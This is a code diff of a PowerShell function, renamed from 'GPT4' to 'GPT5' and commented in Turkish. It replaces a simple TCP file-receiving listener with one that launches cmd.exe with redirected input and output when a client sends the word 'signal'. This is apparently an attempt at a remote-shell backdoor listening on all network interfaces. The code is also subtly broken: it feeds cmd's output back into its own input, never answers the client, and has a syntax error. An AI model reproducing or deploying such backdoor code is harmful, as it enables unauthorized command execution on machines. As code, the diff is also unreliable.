@@ -1,4 +1,4 @@
-function GPT4
+function GPT5
 {
     [CmdletBinding()]
     param(
@@ -13,44 +13,43 @@ function GPT4
     $listener = New-Object System.Net.Sockets.TcpListener([IPAddress]::Any, $Port)
     $listener.Start()
 
-    # Sinyal gönderme işlemi
     while ($true)
     {
+        # İstemciyi kabul ediyoruz.
         $client = $listener.AcceptTcpClient()
+
+        # Gelen veriyi okuyoruz.
         $stream = $client.GetStream()
-        $writer = New-Object System.IO.StreamWriter($stream)
+        $reader = New-Object System.IO.StreamReader($stream)
+        $data = $reader.ReadToEnd()
 
-        # Sinyal gönderme işlemi
-        $writer.Write("Sinyal Gonderildi")
-        $writer.Flush()
-
-        # Dosya transferi
-        $data = New-Object byte[] 4096
-        $fileName = "file.txt"
-        $filePath = Join-Path $env:TEMP $fileName
-        $fileStream = [System.IO.File]::OpenWrite($filePath)
-        $bytesRead = $stream.Read($data, 0, $data.Length)
-        while ($bytesRead -gt 0)
+        # Sinyal geldiğinde cmd.exe'yi açıyoruz.
+        if ($data -eq "signal")
         {
-            $fileStream.Write($data, 0, $bytesRead)
-            $bytesRead = $stream.Read($data, 0, $data.Length)
+            $process = New-Object System.Diagnostics.Process
+            $process.StartInfo.FileName = "cmd.exe"
+            $process.StartInfo.RedirectStandardInput = $true
+            $process.StartInfo.RedirectStandardOutput = $true
+            $process.StartInfo.UseShellExecute = false
+            $process.Start()
+
+            $writer = $process.StandardInput
+            $reader = $process.StandardOutput
+
+            # İstemci ile iletişime geçiyoruz.
+            while ($process.HasExited -eq $false)
+            {
+                $line = $reader.ReadLine()
+                if ($line -ne $null)
+                {
+                    $writer.WriteLine($line)
+                    $writer.Flush()
+                }
+
+                Start-Sleep -Milliseconds 100
+            }
         }
 
-        # Dosya transferi tamamlandı.
-        $fileStream.Close()
         $client.Close()
-
-        # 10 saniye bekleyip tekrar sinyal gönderiyoruz
-        Start-Sleep -Seconds 10
     }
 }
-
-# Ana işlem başlangıcı
-if ($PSBoundParameters.Count -eq 0)
-{
-    Write-Host "Kullanım: GPT4 -IPAddress <IP Adresi> -Port <Port Numarası>"
-    exit
-}
-
-# Listener'a bağlanıyoruz.
-GPT4 -IPAddress $IPAddress -Port $Port
